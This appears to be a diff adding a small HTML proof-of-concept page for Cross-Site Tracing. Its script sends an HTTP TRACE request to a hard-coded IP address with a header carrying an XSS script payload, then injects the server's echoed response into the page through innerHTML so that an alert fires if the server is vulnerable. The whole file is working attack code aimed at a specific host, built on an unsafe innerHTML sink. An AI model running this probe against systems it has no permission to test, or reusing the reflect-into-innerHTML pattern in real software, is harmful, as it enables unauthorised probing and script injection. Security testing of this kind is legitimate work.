@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>If vulnerable, an alert will pop up.</h2>
+    <div id="output"></div>
+    <script>
+      const xhr = new XMLHttpRequest();
+      xhr.open("TRACE", "https://208.54.110.8", true);
+      xhr.setRequestHeader("X-XST-Test", "<script>alert('XSS')</script>");
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4) {
+          document.getElementById("output").innerHTML = xhr.responseText;
+        }
+      };
+      xhr.send();
+    </script>
+  </body>
+</html>
